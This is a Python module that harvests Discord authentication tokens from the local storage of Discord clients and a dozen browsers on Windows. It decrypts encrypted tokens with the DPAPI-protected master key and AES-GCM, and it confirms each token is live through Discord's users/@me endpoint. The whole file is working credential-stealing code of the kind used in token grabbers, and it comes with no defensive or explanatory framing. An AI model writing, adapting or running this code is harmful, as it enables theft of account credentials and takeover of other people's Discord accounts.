from __future__ import annotations

import asyncio
import base64
import json
import os
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Iterable, Iterator

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

from .http_client import DiscordHTTPClient

_TOKEN_REGEXES = (
    re.compile(r"[A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,110}"),
    re.compile(r"mfa\.[A-Za-z0-9_-]{20,120}"),
)
_ENCRYPTED_REGEX = re.compile(r"dQw4w9WgXcQ:[A-Za-z0-9+/=]+")

MAX_FILES_PER_SOURCE = 16
MAX_FILE_SIZE_BYTES = 2 * 1024 * 1024
MAX_LINES_PER_FILE = 25_000
MAX_CANDIDATES_PER_SOURCE = 30
MAX_TOTAL_CANDIDATES = 80
VERIFY_TIMEOUT_SECONDS = 7.0
VERIFY_CONCURRENCY = 10

ProgressCallback = Callable[[str], None]


@dataclass(slots=True)
class TokenSource:
    label: str
    storage: Path
    local_state: Path | None = None

    def valid(self) -> bool:
        return self.storage.exists()


@dataclass(slots=True)
class DiscoveredToken:
    token: str
    user_tag: str
    user_id: str
    source: str


def _candidate_sources() -> list[TokenSource]:
    roaming = Path(os.getenv("APPDATA", ""))
    local = Path(os.getenv("LOCALAPPDATA", ""))
    sources = [
        TokenSource("Discord", roaming / "discord" / "Local Storage" / "leveldb", roaming / "discord" / "Local State"),
        TokenSource("Discord Canary", roaming / "discordcanary" / "Local Storage" / "leveldb", roaming / "discordcanary" / "Local State"),
        TokenSource("Discord PTB", roaming / "discordptb" / "Local Storage" / "leveldb", roaming / "discordptb" / "Local State"),
        TokenSource("Lightcord", roaming / "Lightcord" / "Local Storage" / "leveldb", roaming / "Lightcord" / "Local State"),
        TokenSource("Opera", roaming / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb"),
        TokenSource("Opera GX", roaming / "Opera Software" / "Opera GX Stable" / "Local Storage" / "leveldb"),
        TokenSource("Chrome", local / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Chrome SxS", local / "Google" / "Chrome SxS" / "User Data" / "Local Storage" / "leveldb"),
        TokenSource("Microsoft Edge", local / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Brave", local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Yandex", local / "Yandex" / "YandexBrowser" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Vivaldi", local / "Vivaldi" / "User Data" / "Default" / "Local Storage" / "leveldb"),
    ]
    return [source for source in sources if source.valid()]


def _read_file(path: Path) -> Iterator[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as handle:
            for idx, line in enumerate(handle):
                if idx >= MAX_LINES_PER_FILE:
                    return
                line = line.strip()
                if line:
                    yield line
    except OSError:
        return


def _load_master_key(local_state: Path | None) -> bytes | None:
    if local_state is None or not local_state.exists():
        return None
    try:
        with local_state.open("r", encoding="utf-8") as handle:
            master_key_payload = json.load(handle)["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(master_key_payload)
        if encrypted_key.startswith(b"DPAPI"):
            encrypted_key = encrypted_key[5:]
        if not encrypted_key:
            return None
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None


def _decrypt(blob: str, master_key: bytes | None) -> str | None:
    if not master_key:
        return None
    try:
        raw = base64.b64decode(blob.split("dQw4w9WgXcQ:")[1])
        if len(raw) < 31:
            return None
        iv = raw[3:15]
        payload = raw[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        token = decrypted[:-16].decode("utf-8", errors="ignore").strip()
        return token if _is_probable_token(token) else None
    except Exception:
        return None


def _iter_source_files(source: TokenSource) -> list[Path]:
    entries: list[tuple[float, Path]] = []
    for pattern in ("*.ldb", "*.log"):
        for path in source.storage.glob(pattern):
            try:
                stat = path.stat()
            except OSError:
                continue
            if stat.st_size > MAX_FILE_SIZE_BYTES:
                continue
            entries.append((stat.st_mtime, path))
    entries.sort(key=lambda item: item[0], reverse=True)
    return [item[1] for item in entries[:MAX_FILES_PER_SOURCE]]


def _is_probable_token(value: str) -> bool:
    token = value.strip()
    return any(regex.fullmatch(token) for regex in _TOKEN_REGEXES)


def _extract_from_source(source: TokenSource, progress: ProgressCallback | None = None) -> Iterator[str]:
    master_key = _load_master_key(source.local_state)
    seen: set[str] = set()
    files = _iter_source_files(source)
    for file_idx, file_path in enumerate(files, start=1):
        if progress:
            progress(f"Scanning {source.label}: {file_idx}/{len(files)}")
        for line in _read_file(file_path):
            if master_key:
                for encrypted in _ENCRYPTED_REGEX.findall(line):
                    decrypted = _decrypt(encrypted, master_key)
                    if decrypted:
                        if decrypted not in seen:
                            seen.add(decrypted)
                            yield decrypted
                            if len(seen) >= MAX_CANDIDATES_PER_SOURCE:
                                return
            for regex in _TOKEN_REGEXES:
                for token in regex.findall(line):
                    token = token.strip()
                    if token in seen:
                        continue
                    seen.add(token)
                    yield token
                    if len(seen) >= MAX_CANDIDATES_PER_SOURCE:
                        return


def _token_identity(token: str) -> str:
    try:
        raw = token.split(".")[0]
        return base64.b64decode((raw + "===").encode("ascii")).decode("ascii")
    except Exception:
        return ""


async def verify_tokens(
    client: DiscordHTTPClient,
    candidates: Iterable[tuple[str, str]],
    progress: ProgressCallback | None = None,
) -> list[DiscoveredToken]:
    seen: set[str] = set()
    verified: list[DiscoveredToken] = []
    candidate_list = candidates if isinstance(candidates, list) else list(candidates)
    total = len(candidate_list)
    sem = asyncio.Semaphore(VERIFY_CONCURRENCY)

    async def _verify_one(index: int, token: str, source: str) -> DiscoveredToken | None:
        if progress:
            progress(f"Verifying tokens: {index}/{total}")
        try:
            async with sem:
                response = await asyncio.wait_for(
                    client.request(
                        "GET",
                        "users/@me",
                        token=token,
                        include_debug=False,
                        include_locale=False,
                        super_properties=False,
                        expected_status=(200,),
                    ),
                    timeout=VERIFY_TIMEOUT_SECONDS,
                )
        except Exception:
            return None
        if response.status_code != 200:
            return None
        data = response.json()
        user_id = str(data.get("id"))
        tag = f"{data.get('username')}#{data.get('discriminator')}"
        return DiscoveredToken(
            token=token,
            user_tag=tag,
            user_id=user_id,
            source=source,
        )

    tasks = [
        asyncio.create_task(_verify_one(idx, token, source))
        for idx, (token, source) in enumerate(candidate_list, start=1)
    ]
    for task in asyncio.as_completed(tasks):
        result = await task
        if result is None:
            continue
        dedupe_key = f"{result.user_id}:{result.source}"
        if dedupe_key in seen:
            continue
        seen.add(dedupe_key)
        verified.append(result)
    return verified


def _collect_candidates(progress: ProgressCallback | None = None) -> list[tuple[str, str]]:
    candidates: list[tuple[str, str]] = []
    seen_tokens: set[str] = set()

    sources = _candidate_sources()
    for source_index, source in enumerate(sources, start=1):
        if progress:
            progress(f"Source {source_index}/{len(sources)}: {source.label}")
        for token in _extract_from_source(source, progress=progress):
            if token in seen_tokens:
                continue
            # Quick format sanity + identity check avoids wasting API calls.
            if not _is_probable_token(token):
                continue
            if token.startswith("mfa.") or _token_identity(token):
                seen_tokens.add(token)
                candidates.append((token, source.label))
            if len(candidates) >= MAX_TOTAL_CANDIDATES:
                return candidates
    return candidates


async def discover_tokens(
    client: DiscordHTTPClient,
    progress: ProgressCallback | None = None,
) -> list[DiscoveredToken]:
    candidates = _collect_candidates(progress=progress)
    if progress:
        progress(f"Discovered {len(candidates)} token candidate(s)")
    if not candidates:
        return []
    return await verify_tokens(client, candidates, progress=progress)


__all__ = ["discover_tokens", "DiscoveredToken", "TokenSource", "verify_tokens"]
